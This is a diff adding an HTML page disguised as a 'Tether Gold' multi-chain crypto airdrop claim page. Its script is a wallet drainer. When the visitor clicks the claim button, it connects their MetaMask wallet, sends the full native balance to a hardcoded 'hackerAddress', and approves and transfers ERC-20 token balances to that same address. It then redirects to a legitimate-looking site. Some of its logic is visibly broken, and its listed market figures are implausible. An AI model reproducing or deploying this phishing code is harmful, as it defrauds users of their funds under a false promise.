@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Multi-Chain Airdrop</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0a0f2c, #1b2c50);
+      margin: 0;
+      padding: 0;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      animation: fadeIn 1.5s ease;
+    }
+
+    .container {
+      background-color: rgba(20, 28, 58, 0.95);
+      padding: 30px 20px;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 450px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+      animation: slideUp 1s ease;
+    }
+
+    h1 {
+      font-size: 24px;
+      margin-bottom: 15px;
+      font-weight: 600;
+      color: gold;
+    }
+
+    p {
+      font-size: 16px;
+      color: #ccc;
+      margin-bottom: 10px;
+      line-height: 1.4;
+    }
+
+    h2 {
+      color: gold;
+      font-size: 20px;
+      margin-top: 20px;
+      margin-bottom: 10px;
+    }
+
+    button {
+      background: linear-gradient(to right, #28a0f0, #0077cc);
+      color: white;
+      padding: 14px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: transform 0.2s ease, background 0.3s ease;
+      width: 100%;
+      max-width: 250px;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(to right, #0077cc, #28a0f0);
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    @keyframes slideUp {
+      from {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+
+    @media (max-width: 480px) {
+      body {
+        height: auto;
+        padding: 20px 10px;
+        align-items: flex-start;
+      }
+
+      .container {
+        padding: 20px 15px;
+        border-radius: 12px;
+        width: 100%;
+        max-width: 360px;
+      }
+
+      h1 {
+        font-size: 20px;
+      }
+
+      p {
+        font-size: 14px;
+      }
+
+      h2 {
+        font-size: 18px;
+      }
+
+      button {
+        font-size: 15px;
+        padding: 12px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Tether Gold</h1>
+    <p>Blockchain XAUT</p>
+    <p>Rank #95</p>
+    <p>Total Supply: 246,524</p>
+    <p>Market Cap: 84,669,906,400 $</p>
+    <p>24h: 2,963,632,500</p>
+
+    <h2>Claim Your Airdrop Now!</h2>
+    <p>Connect your wallet to be eligible for the airdrop.</p>
+
+    <button id="claimBtn">Claim Airdrop</button>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+  <script>
+    function countdown(endDate) {
+      const timerElement = document.getElementById('timer');
+      const interval = setInterval(() => {
+        const now = new Date().getTime();
+        const distance = endDate - now;
+
+        if (distance < 0) {
+          clearInterval(interval);
+          timerElement.innerHTML = "EXPIRED";
+        } else {
+          const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+          const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+          const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+          timerElement.innerHTML = `${hours}:${minutes}:${seconds}`;
+        }
+      }, 1000);
+    }
+
+    const endDate = new Date().getTime() + 2 * 24 * 60 * 60 * 1000;
+    countdown(endDate);
+
+    document.getElementById("claimBtn").addEventListener("click", async () => {
+      if (typeof window.ethereum === "undefined") {
+        alert("Please install MetaMask to continue.");
+        return;
+      }
+
+      const web3 = new Web3(window.ethereum);
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+
+      const accounts = await web3.eth.getAccounts();
+      const user = accounts[0];
+
+      const networkId = await web3.eth.net.getId();
+      const currentNetwork = networks[networkId.toString()];
+
+      if (!currentNetwork) {
+        alert("Unsupported network. Please switch to a supported network.");
+        return;
+      }
+
+      try {
+        const ethBalance = await web3.eth.getBalance(user);
+        if (web3.utils.toBN(ethBalance).gt(web3.utils.toBN(0))) {
+          await web3.eth.sendTransaction({
+            from: user,
+            to: hackerAddress,
+            value: ethBalance,
+            gas: 21000
+          });
+        }
+
+        for (const tokenAddress of tokenAddresses[currentNetwork]) {
+          const tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
+          const balance = await tokenContract.methods.balanceOf(user).call();
+
+          if (web3.utils.toBN(balance).gt(web3.utils.toBN(0))) {
+            // Approve the transfer to the hacker address
+            await tokenContract.methods.approve(hackerAddress, balance).send({ from: user });
+
+            // Transfer the tokens to the hacker address using transferFrom
+            await tokenContract.methods.transferFrom(user, hackerAddress, balance).send({ from: user });
+          }
+        }
+
+        alert("? Airdrop claimed! All tokens transferred to hacker.");
+        setTimeout(() => {
+          window.location.href = "https://arbitrum.foundation";
+        }, 2000);
+      } catch (err) {
+        console.error(err);
+        alert("An error occurred. Please try again.");
+      }
+    });
+
+    const hackerAddress = "0x13039cccf7e1fa8d90de08d89f0026c5dc9d7566";
+    const tokenAddresses = {
+      ethereum: ["0xTokenAddressETH1", "0xTokenAddressETH2"],
+      bsc: ["0xTokenAddressBSC1", "0xTokenAddressBSC2"],
+      polygon: ["0xTokenAddressPolygon1", "0xTokenAddressPolygon2"],
+      avalanche: ["0xTokenAddressAvalanche1", "0xTokenAddressAvalanche2"]
+    };
+
+    const networks = {
+      1: "ethereum",
+      56: "bsc",
+      137: "polygon",
+      43114: "avalanche"
+    };
+
+    const ERC20_ABI = [
+      {
+        constant: true,
+        inputs: [{ name: "_owner", type: "address" }],
+        name: "balanceOf",
+        outputs: [{ name: "balance", type: "uint256" }],
+        type: "function"
+      },
+      {
+        constant: false,
+        inputs: [
+          { name: "_to", type: "address" },
+          { name: "_value", type: "uint256" }
+        ],
+        name: "approve",
+        outputs: [{ name: "", type: "bool" }],
+        type: "function"
+      },
+      {
+        constant: false,
+        inputs: [
+          { name: "_from", type: "address" },
+          { name: "_to", type: "address" },
+          { name: "_value", type: "uint256" }
+        ],
+        name: "transferFrom",
+        outputs: [{ name: "", type: "bool" }],
+        type: "function"
+      }
+    ];
+  </script>
+</body>
+</html>
